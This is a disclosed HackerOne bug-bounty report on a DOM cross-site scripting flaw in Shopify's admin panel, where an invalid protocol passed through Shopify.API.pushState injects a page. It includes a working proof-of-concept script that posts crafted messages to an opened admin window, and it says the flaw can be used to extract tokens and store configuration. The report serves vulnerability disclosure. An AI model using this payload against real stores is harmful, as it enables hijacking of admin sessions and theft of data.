---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '868615'
original_report_id: '868615'
title: Inject page in admin panel via Shopify.API.pushState with protocol invalid
weakness: Cross-site Scripting (XSS) - DOM
team_handle: shopify
created_at: '2020-05-08T00:36:48.273Z'
disclosed_at: '2020-12-27T22:14:40.193Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 38
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# Inject page in admin panel via Shopify.API.pushState with protocol invalid

## Metadata

- HackerOne Report ID: 868615
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: shopify
- Disclosed At: 2020-12-27T22:14:40.193Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

# Disclose Token in reports
## Summary
Some time, i found a bug the #662083.
Today I found a new payload, invalid protocol are not tested correctly in filter method.

## Step to Reproduce
See the steps in #662083, but with payload of step 02 replace to:

```javascript
<script>
function attack(){
    const ctx = window.open(location.origin+'/admin/themes', '_blank')
    const data = JSON.stringify({
        message: 'Shopify.API.pushState',
        data: {pathname: "invalid:pages/xss"}
    });

    let interval;
    interval = setInterval(function(){
        if (window.attackSuccess) {
            clearInterval(interval)
        } else {
            ctx.postMessage(data)
        }
    }, 500)
}
attack()
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

## Impact

Abuse the active admin session to extract data as:

Get tokens.
Store config.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
